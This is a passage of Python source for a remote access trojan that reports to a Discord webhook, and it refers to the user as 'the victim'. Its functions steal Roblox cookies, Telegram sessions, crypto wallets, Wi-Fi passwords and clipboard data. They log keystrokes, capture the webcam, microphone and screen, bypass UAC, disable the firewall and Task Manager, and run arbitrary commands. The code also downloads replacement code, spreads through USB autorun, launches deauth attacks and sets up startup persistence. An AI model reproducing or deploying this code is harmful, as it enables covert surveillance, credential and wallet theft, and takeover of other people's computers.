                r0bux_r0b10x = api.get("RobuxBalance", "None")
                pr3mium_r0b10x = api.get("IsPremium", "None")
                av4t4r_r0b10x = api.get("ThumbnailUrl", "None")
                bui1d3r5_c1ub_r0b10x = api.get("IsAnyBuildersClubMember", "None")
        
                size_c00ki3 = len(c00ki3)
                middle_c00ki3 = size_c00ki3 // 2
                c00ki3_part1 = c00ki3[:middle_c00ki3]
                c00ki3_part2 = c00ki3[middle_c00ki3:]

                w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)

                embed = discord.Embed(
                    title=f'Roblox Cookie `{username_pc} "{ip_address_public}"`:',
                    color=color_embed
                )
                embed.set_footer(text=footer_text, icon_url=avatar_embed)
                embed.set_thumbnail(url=av4t4r_r0b10x)
                embed.add_field(name=":compass: Navigator:", value=f"```{n4vigator}```", inline=True)
                embed.add_field(name=":bust_in_silhouette: Username:", value=f"```{us3rn4m3_r0b10x}```", inline=True)
                embed.add_field(name=":bust_in_silhouette: DisplayName:", value=f"```{d1spl4y_nam3_r0b10x}```", inline=True)
                embed.add_field(name=":robot: Id:", value=f"```{us3r_1d_r0b10x}```", inline=True)
                embed.add_field(name=":moneybag: Robux:", value=f"```{r0bux_r0b10x}```", inline=True)
                embed.add_field(name=":tickets: Premium:", value=f"```{pr3mium_r0b10x}```", inline=True)
                embed.add_field(name=":construction_site: Builders Club:", value=f"```{bui1d3r5_c1ub_r0b10x}```", inline=True)
                embed.add_field(name=":cookie: Cookie Part 1:", value=f"```{c00ki3_part1}```", inline=False)
                embed.add_field(name=":cookie: Cookie Part 2:", value=f"```{c00ki3_part2}```", inline=False)

                w3bh00k.send(embed=embed, username=username_embed,
                                avatar_url=avatar_embed)
                
    if not c00ki35_list:
        w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)
        embed = Embed(
            title=f'Roblox Cookie `{username_pc} "{ip_address_public}"`:', 
            description=f"No roblox cookie found.",
            color=color_embed)
        embed.set_footer(text=footer_text, icon_url=avatar_embed)
        w3bh00k.send(embed=embed, username=username_embed, avatar_url=avatar_embed)

keylogger_active = False
keys_buffer = []

def File_Manager(w3bh00k_ur1, action, path=None, new_name=None, file_data=None):
    try:
        if action == "list":
            if not os.path.exists(path):
                send_embed(w3bh00k_ur1, f'File Manager `{username_pc} "{ip_address_public}"`:', f"**Path does not exist:** ```{path}```")
                return

            files = []
            for item in os.listdir(path):
                item_path = os.path.join(path, item)
                files.append(f"📄 {item} ({os.path.getsize(item_path) / 1024:.2f} KB)" if os.path.isfile(item_path) else f"📁 {item}")

            send_embed(w3bh00k_ur1, f'File Manager `{username_pc} "{ip_address_public}"`:', f"**Directory Listing:** ```{path}```\n\n" + "\n".join(files))

        elif action == "download":
            if not os.path.exists(path):
                send_embed(w3bh00k_ur1, f'File Manager `{username_pc} "{ip_address_public}"`:', f"**File not found:** ```{path}```")
                return

            w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)
            with open(path, "rb") as f:
                w3bh00k.send(
                    embed=Embed(
                        title=f'File Download `{username_pc} "{ip_address_public}"`',
                        description=f"```{path}```",
                        color=color_embed
                    ).set_footer(text=footer_text, icon_url=avatar_embed),
                    file=File(f, filename=os.path.basename(path)),
                    username=username_embed,
                    avatar_url=avatar_embed
                )

        elif action == "upload":
            file_path = os.path.join(path, file_data.filename)
            with open(file_path, "wb") as f:
                f.write(file_data.file.read())
            send_embed(w3bh00k_ur1, f'File Manager `{username_pc} "{ip_address_public}"`:', f"**Uploaded:** ```{file_path}```")

        elif action == "delete":
            if not os.path.exists(path):
                send_embed(w3bh00k_ur1, f'File Manager `{username_pc} "{ip_address_public}"`:', f"**Path does not exist:** ```{path}```")
                return

            if os.path.isfile(path):
                os.remove(path)
            else:
                shutil.rmtree(path)
            send_embed(w3bh00k_ur1, f'File Manager `{username_pc} "{ip_address_public}"`:', f"**Deleted:** ```{path}```")

        elif action == "rename":
            if not os.path.exists(path):
                send_embed(w3bh00k_ur1, f'File Manager `{username_pc} "{ip_address_public}"`:', f"**Path does not exist:** ```{path}```")
                return

            new_path = os.path.join(os.path.dirname(path), new_name)
            os.rename(path, new_path)
            send_embed(w3bh00k_ur1, f'File Manager `{username_pc} "{ip_address_public}"`:', f"**Renamed:** ```{path} → {new_path}```")

    except Exception as e:
        send_embed(w3bh00k_ur1, f'File Manager `{username_pc} "{ip_address_public}"`:', f"**Error:** ```{e}```")

lock_control = {
    "keyboard": {"active": False, "listener": None},
    "mouse": {"active": False, "listener": None}
}

def L0ck_K3yM0u53(w3bh00k_ur1, lock_type, state):
    try:
        msgs = []
        if lock_type in ("keyboard", "both"):
            if state and not lock_control["keyboard"]["active"]:
                def block_key(*args, **kwargs): return False
                listener = pynput_keyboard.Listener(on_press=block_key, on_release=block_key, suppress=True)
                listener.start()
                lock_control["keyboard"]["listener"] = listener
                lock_control["keyboard"]["active"] = True
                msgs.append("Keyboard locked.")
            elif not state and lock_control["keyboard"]["active"]:
                lock_control["keyboard"]["listener"].stop()
                lock_control["keyboard"]["listener"] = None
                lock_control["keyboard"]["active"] = False
                msgs.append("Keyboard unlocked.")
            elif state:
                msgs.append("Keyboard already locked.")
            else:
                msgs.append("Keyboard already unlocked.")

        if lock_type in ("mouse", "both"):
            if state and not lock_control["mouse"]["active"]:
                def block_mouse(*args, **kwargs): return False
                listener = pynput_mouse.Listener(on_move=block_mouse, on_click=block_mouse, on_scroll=block_mouse, suppress=True)
                listener.start()
                lock_control["mouse"]["listener"] = listener
                lock_control["mouse"]["active"] = True
                msgs.append("Mouse locked.")
            elif not state and lock_control["mouse"]["active"]:
                lock_control["mouse"]["listener"].stop()
                lock_control["mouse"]["listener"] = None
                lock_control["mouse"]["active"] = False
                msgs.append("Mouse unlocked.")
            elif state:
                msgs.append("Mouse already locked.")
            else:
                msgs.append("Mouse already unlocked.")

        send_embed(w3bh00k_ur1, f'Lock `{username_pc} "{ip_address_public}"`:', "**" + " ".join(msgs) + "**")
    except Exception as e:
        send_embed(w3bh00k_ur1, f'Lock Error `{username_pc} "{ip_address_public}"`:', f"**Error:** ```{e}```")
      
def Byp455_U4C(w3bh00k_ur1):
    try:
        subprocess.run('reg add "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command" /v DelegateExecute /t REG_SZ /d "" /f', shell=True)
        subprocess.run('reg add "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command" /d "cmd /c start /min cmd.exe" /f', shell=True)
        subprocess.run("fodhelper.exe", shell=True)
        send_embed(w3bh00k_ur1, f'UAC Bypass `{username_pc} "{ip_address_public}"`:', "**UAC bypassed (Admin privileges).**")
    except Exception as e:
        send_embed(w3bh00k_ur1, f'UAC Error `{username_pc} "{ip_address_public}"`:', f"```{e}```")

def M1cr0ph0n3_R3c0rd(w3bh00k_ur1, duration=15):
    try:
        fs = 44100
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=2, dtype='float32')
        sd.wait()

        filename = f"Microphone_Recording_{username_pc}.mp3"
        sf.write(filename, recording, fs)

        w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)
        with open(filename, "rb") as f:
            w3bh00k.send(
                embed=Embed(
                    title=f'Microphone Recording `{username_pc} "{ip_address_public}"`',
                    description=f"Duration: **{duration}s**",
                    color=color_embed
                ).set_footer(text=footer_text, icon_url=avatar_embed),
                file=File(f, filename=filename),
                username=username_embed,
                avatar_url=avatar_embed
            )

        os.remove(filename)
    except Exception as e:
        send_embed(w3bh00k_ur1, f'Microphone Recording `{username_pc} "{ip_address_public}"`:', f"**Error:** ```{e}```")

def Scr33n_R3c0rd(w3bh00k_ur1, duration=15):
    try:

        temp_dir = os.path.join(tempfile.gettempdir(), "AimWare")
        os.makedirs(temp_dir, exist_ok=True)
        
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(temp_dir, f"Screen_Recording_{username_pc}_{timestamp}.mp4")

        screen = ImageGrab.grab()
        width, height = screen.size
        
        fourcc_options = ['mp4v', 'XVID', 'MJPG', 'avc1']
        fourcc = None
        for codec in fourcc_options:
            try:
                fourcc = cv2.VideoWriter_fourcc(*codec)
                video = cv2.VideoWriter(filename, fourcc, 15.0, (width, height))
                if video.isOpened():
                    break
            except:
                continue

        if not fourcc or not video.isOpened():
            raise Exception("Failed to initialize video writer with any codec")

        start_time = time.time()
        frame_count = 0
        
        try:
            while (time.time() - start_time) < duration:
                img = ImageGrab.grab()
                frame = np.array(img)
                frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
                
                video.write(frame)
                frame_count += 1
                
                time.sleep(0.05)
                
        finally:
            video.release()
            
            if os.path.exists(filename) and os.path.getsize(filename) > 0:
                w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)
                with open(filename, "rb") as f:
                    w3bh00k.send(
                        embed=Embed(
                            title=f'Screen Recording `{username_pc} "{ip_address_public}"`',
                            description=f"Duration: {duration}s | Frames: {frame_count}",
                            color=color_embed
                        ).set_footer(text=footer_text, icon_url=avatar_embed),
                        file=File(f, filename=os.path.basename(filename)),
                        username=username_embed,
                        avatar_url=avatar_embed
                    )
                
                os.remove(filename)
            else:
                raise Exception("Recording failed - empty file")
                
    except Exception as e:
        send_embed(w3bh00k_ur1, f'Screen Recording `{username_pc} "{ip_address_public}"`:', f"**Error:** ```{str(e)[:1000]}```")
        
        if 'filename' in locals() and os.path.exists(filename):
            try:
                os.remove(filename)
            except:
                pass

def Cl1pb0ard_St34l3r(w3bh00k_ur1):
    try:
        try:
            clipboard_content = pyperclip.paste().strip()
        except pyperclip.PyperclipException as e:
            raise Exception(f"Clipboard access error: {str(e)}")

        if not clipboard_content:
            send_embed(w3bh00k_ur1, 
                      f'Clipboard `{username_pc} "{ip_address_public}"`:', 
                      "**Clipboard is empty or contains only whitespace.**")
            return

        max_length = 1900
        display_content = (clipboard_content[:max_length] + '...') if len(clipboard_content) > max_length else clipboard_content

        embed = Embed(
            title=f'📋 Clipboard Content `{username_pc} "{ip_address_public}"`',
            description=f"```{display_content}```",
            color=color_embed
        )
        
        content_length = len(clipboard_content)
        embed.set_footer(
            text=f"{footer_text} • {content_length} characters",
            icon_url=avatar_embed
        )

        w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)
        w3bh00k.send(
            embed=embed,
            username=username_embed,
            avatar_url=avatar_embed
        )

        if len(clipboard_content) > max_length:
            with tempfile.NamedTemporaryFile(mode='w+', suffix='.txt', delete=False) as temp_file:
                temp_file.write(clipboard_content)
                temp_path = temp_file.name

            try:
                with open(temp_path, 'rb') as file:
                    w3bh00k.send(
                        file=File(file, filename=f"clipboard_content_{username_pc}.txt"),
                        username=username_embed,
                        avatar_url=avatar_embed
                    )
            finally:
                os.remove(temp_path)

    except Exception as e:
        error_msg = str(e)[:1000]
        send_embed(
            w3bh00k_ur1,
            f'Clipboard Error `{username_pc} "{ip_address_public}"`:', 
            f"**Error:** ```{error_msg}```"
        )

def M3ss4g3_B0x(w3bh00k_ur1, text, title="Message"):
    try:
        win32gui.MessageBox(0, text, title, win32con.MB_OK)
        send_embed(w3bh00k_ur1, f'Message Box `{username_pc} "{ip_address_public}"`:', f"**Sent:** ```Title: {title}\nText: {text}```")
    except Exception as e:
        send_embed(w3bh00k_ur1, f'Message Box `{username_pc} "{ip_address_public}"`:', f"**Error:** ```{e}```")

def K3yl0gg3r_T0ggl3(w3bh00k_ur1, state):
    global keylogger_active, keys_buffer
    keylogger_active = state

    if keylogger_active:
        def on_press(key):
            keys_buffer.append(str(key))
            if len(keys_buffer) > 10:
                send_embed(w3bh00k_ur1, f'Keylogger `{username_pc} "{ip_address_public}"`:', f"```{''.join(keys_buffer)}```")
                keys_buffer = []

        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        send_embed(w3bh00k_ur1, f'Keylogger `{username_pc} "{ip_address_public}"`:', "**Keylogger started.**")
    else:
        if keys_buffer:
            send_embed(w3bh00k_ur1, f'Keylogger `{username_pc} "{ip_address_public}"`:', f"```{''.join(keys_buffer)}```")
        keys_buffer = []
        send_embed(w3bh00k_ur1, f'Keylogger `{username_pc} "{ip_address_public}"`:', "**Keylogger stopped.**")

def G3t_L0c4t10n(w3bh00k_ur1):
    try:
        geolocator = Nominatim(user_agent="Napoleon")
        location = geolocator.geocode(f"{latitude}, {longitude}")
        address = location.address if location else "Unknown"

        send_embed(
            w3bh00k_ur1,
            f'Location `{username_pc} "{ip_address_public}"`',
            f"""
            **Latitude:** ```{latitude}```
            **Longitude:** ```{longitude}```
            **Address:** ```{address}```
            **Google Maps:** [Open](https://www.google.com/maps?q={latitude},{longitude})
            """
        )
    except Exception as e:
        send_embed(w3bh00k_ur1, f'Location `{username_pc} "{ip_address_public}"`:', f"**Error:** ```{e}```")
        
def T3l3gr4m_St34l3r(w3bh00k_ur1):
    try:
        telegram_paths = [
            os.path.join(os.getenv('APPDATA'), 'Telegram Desktop', 'tdata'),
            os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Roaming', 'Telegram Desktop', 'tdata')
        ]

        for path in telegram_paths:
            if os.path.exists(path):
                zip_name = f"Telegram_{username_pc}.zip"
                with ZipFile(zip_name, 'w') as zipf:
                    for root, _, files in os.walk(path):
                        for file in files:
                            zipf.write(
                                os.path.join(root, file),
                                os.path.relpath(os.path.join(root, file), path)
                            )

                w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)
                with open(zip_name, 'rb') as f:
                    w3bh00k.send(
                        embed=Embed(
                            title=f'Telegram Session `{username_pc} "{ip_address_public}"`',
                            description="**Stolen Telegram session files.**",
                            color=color_embed
                        ).set_footer(text=footer_text, icon_url=avatar_embed),
                        file=File(f, filename=zip_name),
                        username=username_embed,
                        avatar_url=avatar_embed
                    )
                os.remove(zip_name)
                return

        send_embed(w3bh00k_ur1, f'Telegram Stealer `{username_pc} "{ip_address_public}"`:', "**No Telegram sessions found.**")
    except Exception as e:
        send_embed(w3bh00k_ur1, f'Telegram Stealer `{username_pc} \"{ip_address_public}\"`:', f"**Error:** ```{e}```")

def R35t4rt(w3bh00k_ur1):
    try:
        if sys.platform.startswith('win'):
            os.system('shutdown /r /t 15')
        elif sys.platform.startswith('linux'):
            os.system('shutdown -r +0.25')
        send_embed(
            w3bh00k_ur1, 
            title=f'Restart `{username_pc} "{ip_address_public}"`:', 
            description=f"""
            **Action:** ```Restart the victim's computer.```
            **Status:** ```Restarting```"""
        )
    except Exception as e:
        send_embed(
            w3bh00k_ur1, 
            title=f'Restart `{username_pc} "{ip_address_public}"`:', 
            description=f"""
            **Action:** ```Restart the victim's computer.```
            **Status:** ```Error: {e}```"""
        )

def St34l_Cr1pt0(w3bh00k_ur1):
    try:
        wallets = {
            "Electrum": os.path.join(os.getenv('APPDATA'), "Electrum", "wallets"),
            "Exodus": os.path.join(os.getenv('LOCALAPPDATA'), "Exodus", "exodus.wallet"),
            "MetaMask": os.path.join(os.getenv('APPDATA'), "MetaMask", "Local Storage")
        }

        stolen_data = []
        for name, path in wallets.items():
            if os.path.exists(path):
                shutil.make_archive(f"{name}_Wallet", 'zip', path)
                stolen_data.append(f"💰 **{name}**")

        if stolen_data:
            w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)
            for name in stolen_data:
                with open(f"{name}_Wallet.zip", "rb") as f:
                    w3bh00k.send(
                        embed=Embed(
                            title=f'Crypto Stealer `{username_pc} "{ip_address_public}"`',
                            description=f"**Stolen:** {name}",
                            color=color_embed
                        ).set_footer(text=footer_text, icon_url=avatar_embed),
                        file=File(f, filename=f"{name}_Wallet.zip"),
                        username=username_embed,
                        avatar_url=avatar_embed
                    )
                os.remove(f"{name}_Wallet.zip")
        else:
            send_embed(w3bh00k_ur1, f'Crypto Stealer `{username_pc} "{ip_address_public}"`:', "**No wallets found.**")
    except Exception as e:
        send_embed(w3bh00k_ur1, f'Crypto Error `{username_pc} "{ip_address_public}"`:', f"```{e}```")

def C4m3r4_C4ptur3(w3bh00k_ur1):
    try:
        name_file_capture = f"CameraCapture_{username_pc}.avi"
        time_capture = 10
        cap = cv2.VideoCapture(0)

        if not cap.isOpened():
            Clear()
            send_embed(
                w3bh00k_ur1, 
                title=f'Camera Capture `{username_pc} "{ip_address_public}"`:', 
                description=f"**No cameras found.**"
            )
            return

        def c4ptur3(path_file_capture):
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            out = cv2.VideoWriter(path_file_capture, fourcc, 20.0, (640, 480))
            time_start = datetime.now()
            while (datetime.now() - time_start).seconds < time_capture:
                ret, frame = cap.read()
                if not ret:
                    break
                out.write(frame)

            cap.release()
            out.release()
        try:
            path_file_capture = f"{os.path.join(os.environ.get('USERPROFILE'), 'Documents')}\\{name_file_capture}"
            c4ptur3(path_file_capture)
        except:
            path_file_capture = name_file_capture
            c4ptur3(path_file_capture)

        embed = Embed(title=f"Camera Capture `{username_pc} \"{ip_address_public}\"`:", color=color_embed, description=f"```└── 📷 - {name_file_capture}```")
        embed.set_footer(text=footer_text, icon_url=avatar_embed)

        w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)
        with open(path_file_capture, "rb") as f:
            w3bh00k.send(
                embed=embed,
                file=File(f, filename=name_file_capture),
                username=username_embed,
                avatar_url=avatar_embed
            )
            
        if os.path.exists(path_file_capture):
            os.remove(path_file_capture)
    except:
        send_embed(
            w3bh00k_ur1, 
            title=f'Camera Capture `{username_pc} "{ip_address_public}"`:', 
            description=f"**Unable to make a recording.**"
            )

def Scr33n5h0t(w3bh00k_ur1):
    try:
        name_file_screen = f"Screenshot_{username_pc}.png"

        def capture(path):
            image = ImageGrab.grab(
                bbox=None,
                include_layered_windows=False,
                all_screens=True,
                xdisplay=None
            )
            image.save(path)
        
        try:
            path_file_screen = f"{os.path.join(os.environ.get('USERPROFILE'), 'Documents')}\\{name_file_screen}"
            capture(path_file_screen)
        except:
            path_file_screen = name_file_screen
            capture(path_file_screen)

        embed = Embed(title=f"Screenshot `{username_pc} \"{ip_address_public}\"`:", color=color_embed)
        embed.set_image(url=f"attachment://{name_file_screen}")
        embed.set_footer(text=footer_text, icon_url=avatar_embed )
        w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)
        w3bh00k.send(embed=embed, file=File(path_file_screen, filename=name_file_screen), 
            username=username_embed, avatar_url=avatar_embed
        )

        if os.path.exists(path_file_screen):
            os.remove(path_file_screen)
    except:
        send_embed(
            w3bh00k_ur1, 
            title=f'Screenshot `{username_pc} "{ip_address_public}"`:', 
            description=f"**Unable to take a screenshot.**"
            )

def Shutd0wn(w3bh00k_ur1):
    try:
        if sys.platform.startswith('win'):
            os.system('shutdown /s /t 15')
        elif sys.platform.startswith('linux'):
            os.system('shutdown -h +0.25')

        send_embed(
            w3bh00k_ur1, 
            title=f'Shutdown `{username_pc} "{ip_address_public}"`:', 
            description=f""""
            **Action:** ```Turn off the victim's computer.```
            **Status:** ```Turn Off```"""
            )
    except Exception as e:
        send_embed(
            w3bh00k_ur1, 
            title=f'Shutdown `{username_pc} "{ip_address_public}"`:', 
            description=f"""
            **Action:** ```Turn off the victim's computer.```
            **Status:** ```Error: {e}```"""
            )

def T3rmin4l(w3bh00k_ur1, cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

        output = result.stdout
        error_output = result.stderr

        send_embed(
            w3bh00k_ur1, 
            title=f'Terminal `{username_pc} "{ip_address_public}"`:', 
            description=f"""
            **Action:** ```Write to the victim's computer terminal.```
            **Cmd:** ```{cmd}```
            **Status:** ```Send```
            **Output:** ```{output + error_output}```"""
            )
    except Exception as e:
        send_embed(
            w3bh00k_ur1, 
            title=f'Terminal `{username_pc} "{ip_address_public}"`:', 
            description=f"""
            **Action:** ```Write to the victim's computer terminal.```
            **Cmd:** ```{cmd}```
            **Status:** ```Error: {e}```"""
            )

def Op3n_Url(w3bh00k_ur1, url):
    try:
        webbrowser.open(url)
        send_embed(
            w3bh00k_ur1, 
            title=f'Open Url `{username_pc} "{ip_address_public}"`:', 
            description=f"""
            **Action:** ```Launch a web page on the victim's computer.```
            **Url:** ```{url}```
            **Status:** ```Open```"""
            )
    except Exception as e:
        send_embed(
            w3bh00k_ur1, 
            title=f'Open Url `{username_pc} "{ip_address_public}"`:', 
            description=f"""
            **Action:** ```Launch a web page on the victim's computer.```
            **Url:** ```{url}```
            **Status:** ```Error: {e}```"""
            )

def B10ck_W3b5it3(w3bh00k_ur1, w3b51t3):
    "Perm Admin Required"
    try:
        d1r3ct0ry = os.getcwd()
        d15k_l3tt3r = os.path.splitdrive(d1r3ct0ry)[0]

        hosts_path = f"{d15k_l3tt3r}\\Windows\\System32\\drivers\\etc\\hosts"
        if os.path.exists(hosts_path):
            pass
        else:
            hosts_path = f"C:\\Windows\\System32\\drivers\\etc\\hosts"

        with open(hosts_path, "a") as file:
            file.write("\n127.0.0.1 " + website)

        send_embed(
            w3bh00k_ur1, 
            title=f'Block Website `{username_pc} "{ip_address_public}"`:', 
            description=f"""
            **Action:** ```Blocks a website on the victim's computer.```
            **Url:** ```{w3b51t3}```
            **Status:** ```Blocked```"""
            )
    except Exception as e:
        send_embed(
            w3bh00k_ur1, 
            title=f'Block Website `{username_pc} "{ip_address_public}"`:', 
            description=f"""
            **Action:** ```Blocks a website on the victim's computer.```
            **Url:** ```{w3b51t3}```
            **Status:** ```Error: {e}```"""
            )

def S3lf_D3struc7(w3bh00k_ur1):
    try:
        send_embed(w3bh00k_ur1, f'Self-Destruct `{username_pc} "{ip_address_public}"`:', "**Removing traces...**")
        os.remove(sys.argv[0])
        subprocess.run("taskkill /im cmd.exe /f", shell=True)
    except: pass

def Op3n_C4lcul4t0r(w3bh00k_ur1, number):
    try:
        i = 0
        for i in range(int(number)):
            subprocess.Popen('calc.exe')
            i += 1
        send_embed(
            w3bh00k_ur1, 
            title=f'Open Calculator `{username_pc} "{ip_address_public}"`:', 
            description=f"""
            **Action:** ```Opens the calculator on the victim's computer a certain number of times.```
            **Number:** ```{number}```
            **Status:** ```Open```"""
            )
    except Exception as e:
        send_embed(
            w3bh00k_ur1, 
            title=f'Open Calculator `{username_pc} "{ip_address_public}"`:', 
            description=f"""
            **Action:** ```Opens the calculator on the victim's computer a certain number of times.```
            **Number:** ```{number}```
            **Status:** ```Error: {e}```"""
            )

def Upd4t3_R4T(w3bh00k_ur1, github_raw_url):
    try:
        new_code = requests.get(github_raw_url).text
        with open(sys.argv[0], "w") as f:
            f.write(new_code)
        send_embed(w3bh00k_ur1, f'R4T Updated `{username_pc} "{ip_address_public}"`:', "**Restarting...**")

        os.startfile(sys.argv[0])
        os._exit(0)
    except Exception as e:
        send_embed(w3bh00k_ur1, f'Update Error `{username_pc} "{ip_address_public}"`:', f"```{e}```")

def D1s4bl3_F1r3w4ll(w3bh00k_ur1):
    try:
        subprocess.run("netsh advfirewall set allprofiles state off", shell=True, check=True)
        send_embed(w3bh00k_ur1, f'Firewall `{username_pc} "{ip_address_public}"`:', "**Firewall disabled.**")
    except Exception as e:
        send_embed(w3bh00k_ur1, f'Firewall Error `{username_pc} "{ip_address_public}"`:', f"```{e}```")

def B10ck_T45k_M4n4g3r(w3bh00k_ur1):
    "Perm Admin Required"
    try:
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'] == 'Taskmgr.exe':
                proc.terminate()
                break
        subprocess.run("reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", shell=True)
        Clear()
        send_embed(
            w3bh00k_ur1, 
            title=f'Block Task Manager `{username_pc} "{ip_address_public}"`:', 
            description=f"""
            **Action:** ```Blocks the task manager of the victim's computer.```
            **Status:** ```Blocked```"""
            )
    except Exception as e:
        send_embed(
            w3bh00k_ur1, 
            title=f'Block Task Manager `{username_pc} "{ip_address_public}"`:', 
            description=f"""
            **Action:** ```Blocks the task manager of the victim's computer.```
            **Status:** ```Error: {e}```"""
            )

def K1ll_Pr0c355(w3bh00k_ur1, process_name):
    try:
        subprocess.run(f"taskkill /IM {process_name} /F", shell=True, check=True)
        send_embed(w3bh00k_ur1, f'Process Killer `{username_pc} "{ip_address_public}"`:', f"**Killed:** ```{process_name}```")
    except Exception as e:
        send_embed(w3bh00k_ur1, f'Process Killer Error `{username_pc} "{ip_address_public}"`:', f"```{e}```")

def W3bc4m_Sh0t(w3bh00k_ur1):
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            cv2.imwrite("webcam.jpg", frame)
            w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)
            with open("webcam.jpg", "rb") as f:
                w3bh00k.send(
                    embed=Embed(
                        title=f'Webcam Shot `{username_pc} "{ip_address_public}"`',
                        color=color_embed
                    ).set_image(url="attachment://webcam.jpg"),
                    file=File(f, filename="webcam.jpg"),
                    username=username_embed,
                    avatar_url=avatar_embed
                )
            os.remove("webcam.jpg")
        cap.release()
    except Exception as e:
        send_embed(w3bh00k_ur1, f'Webcam Error `{username_pc} "{ip_address_public}"`:', f"```{e}```")

def V0ic3(w3bh00k_ur1, text):
    try:
        voice = pyttsx3.init()
        voice.say(text)
        voice.runAndWait()

        send_embed(
            w3bh00k_ur1, 
            title=f'Voice `{username_pc} "{ip_address_public}"`:', 
            description=f"""
            **Action:** ```Plays a voice with the chosen text on the victim's computer.```
            **Text:** ```{text}```
            **Status:** ```Send```"""
            )
    except Exception as e:
        send_embed(
            w3bh00k_ur1, 
            title=f'Voice `{username_pc} "{ip_address_public}"`:', 
            description=f"""
            **Action:** ```Plays a voice with the chosen text on the victim's computer.```
            **Text:** ```{text}```
            **Status:** ```Error: {e}```"""
            )

def USB_1nf3ct(w3bh00k_ur1):
    try:
        drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
        for drive in drives:
            shutil.copy(sys.argv[0], f"{drive}Windows_Update.exe")
            with open(f"{drive}autorun.inf", "w") as f:
                f.write(f"[autorun]\nopen=Windows_Update.exe\nicon=shell32.dll,4")
        send_embed(w3bh00k_ur1, f'USB Spread `{username_pc} "{ip_address_public}"`:', "**Copied to all USB drives.**")
    except Exception as e:
        send_embed(w3bh00k_ur1, f'USB Error `{username_pc} "{ip_address_public}"`:', f"```{e}```")

def St34l_W1F1(w3bh00k_ur1):
    try:
        data = subprocess.check_output("netsh wlan show profiles", shell=True).decode('utf-8')
        profiles = [line.split(":")[1].strip() for line in data.split('\n') if "All User Profile" in line]
        passwords = []

        for profile in profiles:
            try:
                results = subprocess.check_output(f"netsh wlan show profile \"{profile}\" key=clear", shell=True).decode('utf-8')
                password = [line.split(":")[1].strip() for line in results.split('\n') if "Key Content" in line][0]
                passwords.append(f"📶 **{profile}**: `{password}`")
            except:
                passwords.append(f"📶 **{profile}**: `No Password`")

        send_embed(w3bh00k_ur1, f'WiFi Stealer `{username_pc} "{ip_address_public}"`:', "\n".join(passwords))
    except Exception as e:
        send_embed(w3bh00k_ur1, f'WiFi Error `{username_pc} "{ip_address_public}"`:', f"```{e}```")

def D34uth_4tt4ck(w3bh00k_ur1, target_mac=None):
    try:
        if not target_mac:
            subprocess.run(f"aireplay-ng -0 10 -a {os.popen('netsh wlan show interfaces | findstr BSSID').read().split()[1]} wlan0", shell=True)
            send_embed(w3bh00k_ur1, f'Deauth Attack `{username_pc} "{ip_address_public}"`:', "**Broadcasted deauth packets to all devices!**")
        else:
            subprocess.run(f"aireplay-ng -0 10 -a {os.popen('netsh wlan show interfaces | findstr BSSID').read().split()[1]} -c {target_mac} wlan0", shell=True)
            send_embed(w3bh00k_ur1, f'Deauth Attack `{username_pc} "{ip_address_public}"`:', f"**Targeted device:** ```{target_mac}```")
    except Exception as e:
        send_embed(w3bh00k_ur1, f'Deauth Error `{username_pc} "{ip_address_public}"`:', f"```{e}```")

def L1st_C0nn3ct3d_D3v1c3s(w3bh00k_ur1):
    try:
        result = subprocess.check_output("arp -a", shell=True).decode('utf-8', errors='ignore')
        devices = []
        for line in result.split('\n'):
            if "dynamic" in line.lower():
                ip = line.split()[0]
                mac = line.split()[1]
                devices.append(f"🔹 `{ip}` → `{mac}`")

        if not devices:
            send_embed(w3bh00k_ur1, f'Network Devices `{username_pc} "{ip_address_public}"`:', "**No devices found (ARP cache empty).**")
        else:
            send_embed(
                w3bh00k_ur1,
                f'Network Devices `{username_pc} "{ip_address_public}"`', 
                f"**Connected Devices:**\n" + "\n".join(devices) + 
                f"\n\n**Total:** `{len(devices)}` devices"
            )
    except Exception as e:
        send_embed(w3bh00k_ur1, f'Network Scan Error `{username_pc} "{ip_address_public}"`:', f"```{e}```")

def St4rtup():
    try:
        file_path = os.path.abspath(sys.argv[0])

        if file_path.endswith(".exe"):
            ext = "exe"
        elif file_path.endswith(".py"):
            ext = "py"

        new_name = f"ㅤ.{ext}"

        if sys.platform.startswith('win'):
            folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            path_new_file = os.path.join(folder, new_name)
            shutil.copy(file_path, path_new_file)
            
            try:
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Run",
                    0, winreg.KEY_SET_VALUE
                )
                winreg.SetValueEx(key, " ", 0, winreg.REG_SZ, file_path)
                winreg.CloseKey(key)
            except:
                pass
            
        elif sys.platform.startswith('darwin'):
            folder = os.path.join(os.path.expanduser('~'), 'Library', 'LaunchAgents')
            path_new_file = os.path.join(folder, new_name)
            shutil.copy(file_path, path_new_file)
            
        elif sys.platform.startswith('linux'):
            folder = os.path.join(os.path.expanduser('~'), '.config', 'autostart')
            path_new_file = os.path.join(folder, new_name)
            shutil.copy(file_path, path_new_file)
            
        if os.path.exists(path_new_file):
            os.chmod(path_new_file, 0o777)
            
    except Exception as e:
